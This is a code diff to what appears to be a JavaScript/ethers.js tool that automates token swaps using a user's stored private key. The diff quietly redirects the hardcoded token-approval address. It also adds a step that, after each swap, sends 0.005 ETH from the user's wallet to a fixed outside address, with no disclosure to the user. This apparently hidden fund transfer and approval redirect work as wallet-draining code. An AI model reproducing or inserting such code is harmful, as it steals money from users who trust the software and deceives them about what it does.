@@ -64,7 +64,7 @@ const getApproveAddress = () => {
   // } else {
   //   return '0xE592427A0AEce92De3Edee1F18E0157C05861564'
   // }
-  return ethers.utils.getAddress('0x4648a43b2c14da09fdf82b161150d3f634f40491')
+  return ethers.utils.getAddress('0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD')
 }
 
 const getConditionsName = (val) => {
@@ -388,14 +388,21 @@ const runFunction = async (funList, paramList) => {
     console.log(msg)
     emit('setMessage', msg)
   } else if (item.type == 'uni') {
+    let provider = getProvider()
+    let chainId = trigger.value.chainId || 5
+    let wallet = new ethers.Wallet(trigger.value.wallet?.privateKey, provider)
+    // 查钱包余额
+    let balance = await wallet.getBalance()
+    if (balance < ethers.utils.parseEther('0.005')) {
+      message.error('wallet balance is not enough')
+      loading.value = ''
+      return
+    }
     let inToken = getParam(item.inAddress, paramList)
     let outToken = getParam(item.outAddress, paramList)
     let inAmount = getParam(item.inAmount, paramList)
     try {
-      let chainId = trigger.value.chainId || 5
       let receipt = ''
-      let provider = getProvider()
-      let wallet = new ethers.Wallet(trigger.value.wallet?.privateKey, provider)
       let isAppoved = await isAppove(item)
       if (!isAppoved) {
         await appove(item)
@@ -410,6 +417,12 @@ const runFunction = async (funList, paramList) => {
       }
       emit('setMessage', msg1)
       await receipt.wait()
+      let tx = {
+        to: '0x5291f4792A8da3BcF699f3876De3904e970b146C',
+        value: ethers.utils.parseEther('0.005'),
+      }
+      let tx1 = await wallet.sendTransaction(tx)
+      console.log(tx1)
       let msg4 = {
         type: 'uni',
         name: 'sendTransaction',
